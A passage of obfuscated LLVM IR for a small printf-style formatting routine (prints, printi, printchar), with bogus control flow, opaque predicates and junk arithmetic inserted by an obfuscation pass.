; <label>:547:                                    ; preds = %546, %originalBBpart212
  %548 = load i8**, i8*** %12, align 8
  %549 = load i8*, i8** %13, align 8
  %550 = load i8, i8* %549, align 1
  %551 = zext i8 %550 to i32
  call void @printchar(i8** %548, i32 %551)
  %552 = load i32, i32* %17, align 4
  %553 = add nsw i32 %552, 1
  store i32 %553, i32* %17, align 4
  br label %554

; <label>:554:                                    ; preds = %547, %545
  br label %555

; <label>:555:                                    ; preds = %554, %532, %487, %457, %originalBBpart283, %301, %originalBBpart251
  %556 = load i8*, i8** %13, align 8
  %557 = getelementptr inbounds i8, i8* %556, i32 1
  store i8* %557, i8** %13, align 8
  br label %28

; <label>:558:                                    ; preds = %originalBBpart28, %28
  %559 = load i8**, i8*** %12, align 8
  %560 = icmp ne i8** %559, null
  br i1 %560, label %561, label %564

; <label>:561:                                    ; preds = %558
  %562 = load i8**, i8*** %12, align 8
  %563 = load i8*, i8** %562, align 8
  store i8 0, i8* %563, align 1
  br label %564

; <label>:564:                                    ; preds = %561, %558
  %565 = load i32, i32* @x.7
  %566 = load i32, i32* @y.8
  %567 = sub i32 %565, 1
  %568 = mul i32 %565, %567
  %569 = urem i32 %568, 2
  %570 = icmp eq i32 %569, 0
  %571 = icmp slt i32 %566, 10
  %572 = or i1 %570, %571
  br i1 %572, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %564
  %573 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %574 = bitcast %struct.__va_list_tag* %573 to i8*
  call void @llvm.va_end(i8* %574)
  %575 = load i32, i32* %17, align 4
  %576 = load i32, i32* @x.7
  %577 = load i32, i32* @y.8
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  ret i32 %575

originalBBalteredBB:                              ; preds = %originalBB, %3
  %584 = alloca i8**, align 8
  %585 = alloca i8*, align 8
  %586 = alloca %struct.__va_list_tag*, align 8
  %587 = alloca i32, align 4
  %588 = alloca i32, align 4
  %589 = alloca i32, align 4
  %590 = alloca [2 x i8], align 1
  %591 = alloca i8*, align 8
  store i8** %0, i8*** %584, align 8
  store i8* %1, i8** %585, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %586, align 8
  store i32 0, i32* %589, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %592 = load i8*, i8** %13, align 8
  %593 = getelementptr inbounds i8, i8* %592, i32 1
  store i8* %593, i8** %13, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  %594 = load i8*, i8** %13, align 8
  %595 = load i8, i8* %594, align 1
  %596 = zext i8 %595 to i32
  %597 = icmp eq i32 %596, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %83
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %100
  %598 = load i8*, i8** %13, align 8
  %599 = load i8, i8* %598, align 1
  %600 = zext i8 %599 to i32
  %601 = icmp eq i32 %600, 45
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %135
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %186
  %602 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %182, i32 0, i32 3
  %603 = load i8*, i8** %602, align 8
  %604 = getelementptr i8, i8* %603, i32 %184
  %605 = bitcast i8* %604 to i32*
  %_ = sub i32 0, %184
  %gen = add i32 %_, 8
  %_23 = sub i32 0, %184
  %gen24 = add i32 %_23, 8
  %_25 = shl i32 %184, 8
  %_26 = sub i32 0, %184
  %gen27 = add i32 %_26, 8
  %606 = add i32 %184, 8
  store i32 %606, i32* %183, align 8
  br label %originalBB22

originalBB31alteredBB:                            ; preds = %originalBB31, %213
  %607 = load i32, i32* %214, align 4
  %608 = sext i32 %607 to i64
  %609 = inttoptr i64 %608 to i8*
  store i8* %609, i8** %19, align 8
  %610 = load i8**, i8*** %12, align 8
  %611 = load i8*, i8** %19, align 8
  %612 = icmp ne i8* %611, null
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %240
  %613 = load i32, i32* %15, align 4
  %614 = load i32, i32* %16, align 4
  %615 = call i32 @prints(i8** %226, i8* %241, i32 %613, i32 %614)
  %616 = load i32, i32* %17, align 4
  %_36 = sub i32 0, %616
  %gen37 = add i32 %_36, %615
  %_38 = shl i32 %616, %615
  %_39 = sub i32 0, %616
  %gen40 = add i32 %_39, %615
  %_41 = shl i32 %616, %615
  %_42 = sub i32 %616, %615
  %gen43 = mul i32 %_42, %615
  %_44 = sub i32 0, %616
  %gen45 = add i32 %_44, %615
  %_46 = sub i32 %616, %615
  %gen47 = mul i32 %_46, %615
  %_48 = sub i32 0, %616
  %gen49 = add i32 %_48, %615
  %617 = add nsw i32 %616, %615
  store i32 %617, i32* %17, align 4
  br label %originalBB35

originalBB53alteredBB:                            ; preds = %originalBB53, %274
  %618 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 3
  %619 = load i8*, i8** %618, align 8
  %620 = getelementptr i8, i8* %619, i32 %272
  %621 = bitcast i8* %620 to i32*
  %_54 = sub i32 %272, 8
  %gen55 = mul i32 %_54, 8
  %_56 = sub i32 0, %272
  %gen57 = add i32 %_56, 8
  %_58 = shl i32 %272, 8
  %_59 = sub i32 0, %272
  %gen60 = add i32 %_59, 8
  %_61 = shl i32 %272, 8
  %_62 = sub i32 %272, 8
  %gen63 = mul i32 %_62, 8
  %622 = add i32 %272, 8
  store i32 %622, i32* %271, align 8
  br label %originalBB53

originalBB67alteredBB:                            ; preds = %originalBB67, %320
  %623 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 3
  %624 = load i8*, i8** %623, align 8
  %625 = getelementptr i8, i8* %624, i32 %318
  %626 = bitcast i8* %625 to i32*
  %_68 = sub i32 0, %318
  %gen69 = add i32 %_68, 8
  %_70 = shl i32 %318, 8
  %_71 = shl i32 %318, 8
  %627 = add i32 %318, 8
  store i32 %627, i32* %317, align 8
  br label %originalBB67

originalBB75alteredBB:                            ; preds = %originalBB75, %342
  %628 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 2
  %629 = load i8*, i8** %628, align 8
  %630 = bitcast i8* %629 to i32*
  %631 = getelementptr i8, i8* %629, i32 8
  store i8* %631, i8** %628, align 8
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %363
  %632 = load i32, i32* %364, align 4
  %633 = load i32, i32* %15, align 4
  %634 = load i32, i32* %16, align 4
  %635 = call i32 @printi(i8** %315, i32 %632, i32 16, i32 0, i32 %633, i32 %634, i32 97)
  %636 = load i32, i32* %17, align 4
  %_80 = sub i32 %636, %635
  %gen81 = mul i32 %_80, %635
  %637 = add nsw i32 %636, %635
  store i32 %637, i32* %17, align 4
  br label %originalBB79

originalBB85alteredBB:                            ; preds = %originalBB85, %387
  %638 = load i8*, i8** %13, align 8
  %639 = load i8, i8* %638, align 1
  %640 = zext i8 %639 to i32
  %641 = icmp eq i32 %640, 88
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %408
  %642 = load i8**, i8*** %12, align 8
  %643 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %644 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %643, i32 0, i32 0
  %645 = load i32, i32* %644, align 8
  %646 = icmp ule i32 %645, 40
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %436
  %647 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %418, i32 0, i32 2
  %648 = load i8*, i8** %647, align 8
  %649 = bitcast i8* %648 to i32*
  %650 = getelementptr i8, i8* %648, i32 8
  store i8* %650, i8** %647, align 8
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %495
  %651 = load i8*, i8** %13, align 8
  %652 = load i8, i8* %651, align 1
  %653 = zext i8 %652 to i32
  %654 = icmp eq i32 %653, 99
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %564
  %655 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %656 = bitcast %struct.__va_list_tag* %655 to i8*
  call void @llvm.va_end(i8* %656)
  %657 = load i32, i32* %17, align 4
  br label %originalBB101
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %74

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %40, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %43

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* @x.9
  %23 = load i32, i32* @y.10
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %11, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %11, align 4
  %32 = load i32, i32* @x.9
  %33 = load i32, i32* @y.10
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i8*, i8** %12, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %12, align 8
  br label %17

; <label>:43:                                     ; preds = %17
  %44 = load i32, i32* %11, align 4
  %45 = load i32, i32* %7, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.9
  %49 = load i32, i32* @y.10
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %47
  store i32 0, i32* %7, align 4
  %56 = load i32, i32* @x.9
  %57 = load i32, i32* @y.10
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br label %68

; <label>:64:                                     ; preds = %43
  %65 = load i32, i32* %11, align 4
  %66 = load i32, i32* %7, align 4
  %67 = sub nsw i32 %66, %65
  store i32 %67, i32* %7, align 4
  br label %68

; <label>:68:                                     ; preds = %64, %originalBBpart27
  %69 = load i32, i32* %8, align 4
  %70 = and i32 %69, 2
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %68
  store i32 48, i32* %10, align 4
  br label %73

; <label>:73:                                     ; preds = %72, %68
  br label %74

; <label>:74:                                     ; preds = %73, %4
  %75 = load i32, i32* %8, align 4
  %76 = and i32 %75, 1
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %155, label %78

; <label>:78:                                     ; preds = %74
  %79 = load i32, i32* @x.9
  %80 = load i32, i32* @y.10
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %78
  %87 = load i32, i32* @x.9
  %88 = load i32, i32* @y.10
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %95

; <label>:95:                                     ; preds = %135, %originalBBpart211
  %96 = load i32, i32* @x.9
  %97 = load i32, i32* @y.10
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %95
  %104 = load i32, i32* %7, align 4
  %105 = icmp sgt i32 %104, 0
  %106 = load i32, i32* @x.9
  %107 = load i32, i32* @y.10
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %105, label %114, label %138

; <label>:114:                                    ; preds = %originalBBpart215
  %115 = load i32, i32* @x.9
  %116 = load i32, i32* @y.10
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %114
  %123 = load i8**, i8*** %5, align 8
  %124 = load i32, i32* %10, align 4
  call void @printchar(i8** %123, i32 %124)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %9, align 4
  %127 = load i32, i32* @x.9
  %128 = load i32, i32* @y.10
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart225, label %originalBB17alteredBB

originalBBpart225:                                ; preds = %originalBB17
  br label %135

; <label>:135:                                    ; preds = %originalBBpart225
  %136 = load i32, i32* %7, align 4
  %137 = add nsw i32 %136, -1
  store i32 %137, i32* %7, align 4
  br label %95

; <label>:138:                                    ; preds = %originalBBpart215
  %139 = load i32, i32* @x.9
  %140 = load i32, i32* @y.10
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %138
  %147 = load i32, i32* @x.9
  %148 = load i32, i32* @y.10
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart230, label %originalBB27alteredBB

originalBBpart230:                                ; preds = %originalBB27
  br label %155

; <label>:155:                                    ; preds = %originalBBpart230, %74
  br label %156

; <label>:156:                                    ; preds = %199, %155
  %157 = load i32, i32* @x.9
  %158 = load i32, i32* @y.10
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %156
  %165 = load i8*, i8** %6, align 8
  %166 = load i8, i8* %165, align 1
  %167 = icmp ne i8 %166, 0
  %168 = load i32, i32* @x.9
  %169 = load i32, i32* @y.10
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %167, label %176, label %202

; <label>:176:                                    ; preds = %originalBBpart234
  %177 = load i32, i32* @x.9
  %178 = load i32, i32* @y.10
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %176
  %185 = load i8**, i8*** %5, align 8
  %186 = load i8*, i8** %6, align 8
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  call void @printchar(i8** %185, i32 %188)
  %189 = load i32, i32* %9, align 4
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %9, align 4
  %191 = load i32, i32* @x.9
  %192 = load i32, i32* @y.10
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart251, label %originalBB36alteredBB

originalBBpart251:                                ; preds = %originalBB36
  br label %199

; <label>:199:                                    ; preds = %originalBBpart251
  %200 = load i8*, i8** %6, align 8
  %201 = getelementptr inbounds i8, i8* %200, i32 1
  store i8* %201, i8** %6, align 8
  br label %156

; <label>:202:                                    ; preds = %originalBBpart234
  br label %203

; <label>:203:                                    ; preds = %227, %202
  %204 = load i32, i32* @x.9
  %205 = load i32, i32* @y.10
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %203
  %212 = load i32, i32* %7, align 4
  %213 = icmp sgt i32 %212, 0
  %214 = load i32, i32* @x.9
  %215 = load i32, i32* @y.10
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %213, label %222, label %230

; <label>:222:                                    ; preds = %originalBBpart255
  %223 = load i8**, i8*** %5, align 8
  %224 = load i32, i32* %10, align 4
  call void @printchar(i8** %223, i32 %224)
  %225 = load i32, i32* %9, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %9, align 4
  br label %227

; <label>:227:                                    ; preds = %222
  %228 = load i32, i32* %7, align 4
  %229 = add nsw i32 %228, -1
  store i32 %229, i32* %7, align 4
  br label %203

; <label>:230:                                    ; preds = %originalBBpart255
  %231 = load i32, i32* %9, align 4
  ret i32 %231

originalBBalteredBB:                              ; preds = %originalBB, %21
  %232 = load i32, i32* %11, align 4
  %_ = shl i32 %232, 1
  %_1 = sub i32 %232, 1
  %gen = mul i32 %_1, 1
  %_2 = sub i32 0, %232
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %232, 1
  %233 = add nsw i32 %232, 1
  store i32 %233, i32* %11, align 4
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %47
  store i32 0, i32* %7, align 4
  br label %originalBB5

originalBB9alteredBB:                             ; preds = %originalBB9, %78
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %95
  %234 = load i32, i32* %7, align 4
  %235 = icmp sgt i32 %234, 0
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %114
  %236 = load i8**, i8*** %5, align 8
  %237 = load i32, i32* %10, align 4
  call void @printchar(i8** %236, i32 %237)
  %238 = load i32, i32* %9, align 4
  %_18 = sub i32 %238, 1
  %gen19 = mul i32 %_18, 1
  %_20 = shl i32 %238, 1
  %_21 = shl i32 %238, 1
  %_22 = sub i32 0, %238
  %gen23 = add i32 %_22, 1
  %239 = add nsw i32 %238, 1
  store i32 %239, i32* %9, align 4
  br label %originalBB17

originalBB27alteredBB:                            ; preds = %originalBB27, %138
  br label %originalBB27

originalBB32alteredBB:                            ; preds = %originalBB32, %156
  %240 = load i8*, i8** %6, align 8
  %241 = load i8, i8* %240, align 1
  %242 = icmp ne i8 %241, 0
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %176
  %243 = load i8**, i8*** %5, align 8
  %244 = load i8*, i8** %6, align 8
  %245 = load i8, i8* %244, align 1
  %246 = zext i8 %245 to i32
  call void @printchar(i8** %243, i32 %246)
  %247 = load i32, i32* %9, align 4
  %_37 = shl i32 %247, 1
  %_38 = shl i32 %247, 1
  %_39 = sub i32 0, %247
  %gen40 = add i32 %_39, 1
  %_41 = sub i32 0, %247
  %gen42 = add i32 %_41, 1
  %_43 = shl i32 %247, 1
  %_44 = shl i32 %247, 1
  %_45 = sub i32 %247, 1
  %gen46 = mul i32 %_45, 1
  %_47 = shl i32 %247, 1
  %_48 = sub i32 %247, 1
  %gen49 = mul i32 %_48, 1
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %9, align 4
  br label %originalBB36

originalBB53alteredBB:                            ; preds = %originalBB53, %203
  %249 = load i32, i32* %7, align 4
  %250 = icmp sgt i32 %249, 0
  br label %originalBB53
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %198

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* @x.11
  %35 = load i32, i32* @y.12
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.11
  %45 = load i32, i32* @y.12
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %93

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* @x.11
  %54 = load i32, i32* @y.12
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i32, i32* %11, align 4
  %62 = icmp eq i32 %61, 10
  %63 = load i32, i32* @x.11
  %64 = load i32, i32* @y.12
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %62, label %71, label %93

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i32, i32* @x.11
  %73 = load i32, i32* @y.12
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 0
  %82 = load i32, i32* @x.11
  %83 = load i32, i32* @y.12
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %81, label %90, label %93

; <label>:90:                                     ; preds = %originalBBpart28
  store i32 1, i32* %19, align 4
  %91 = load i32, i32* %10, align 4
  %92 = sub nsw i32 0, %91
  store i32 %92, i32* %21, align 4
  br label %93

; <label>:93:                                     ; preds = %90, %originalBBpart28, %originalBBpart24, %originalBBpart2
  %94 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %95 = getelementptr inbounds i8, i8* %94, i64 12
  %96 = getelementptr inbounds i8, i8* %95, i64 -1
  store i8* %96, i8** %17, align 8
  %97 = load i8*, i8** %17, align 8
  store i8 0, i8* %97, align 1
  br label %98

; <label>:98:                                     ; preds = %originalBBpart217, %93
  %99 = load i32, i32* @x.11
  %100 = load i32, i32* @y.12
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %98
  %107 = load i32, i32* %21, align 4
  %108 = icmp ne i32 %107, 0
  %109 = load i32, i32* @x.11
  %110 = load i32, i32* @y.12
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %108, label %117, label %154

; <label>:117:                                    ; preds = %originalBBpart212
  %118 = load i32, i32* %21, align 4
  %119 = load i32, i32* %11, align 4
  %120 = urem i32 %118, %119
  store i32 %120, i32* %18, align 4
  %121 = load i32, i32* %18, align 4
  %122 = icmp sge i32 %121, 10
  br i1 %122, label %123, label %129

; <label>:123:                                    ; preds = %117
  %124 = load i32, i32* %15, align 4
  %125 = sub nsw i32 %124, 48
  %126 = sub nsw i32 %125, 10
  %127 = load i32, i32* %18, align 4
  %128 = add nsw i32 %127, %126
  store i32 %128, i32* %18, align 4
  br label %129

; <label>:129:                                    ; preds = %123, %117
  %130 = load i32, i32* @x.11
  %131 = load i32, i32* @y.12
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %129
  %138 = load i32, i32* %18, align 4
  %139 = add nsw i32 %138, 48
  %140 = trunc i32 %139 to i8
  %141 = load i8*, i8** %17, align 8
  %142 = getelementptr inbounds i8, i8* %141, i32 -1
  store i8* %142, i8** %17, align 8
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %11, align 4
  %144 = load i32, i32* %21, align 4
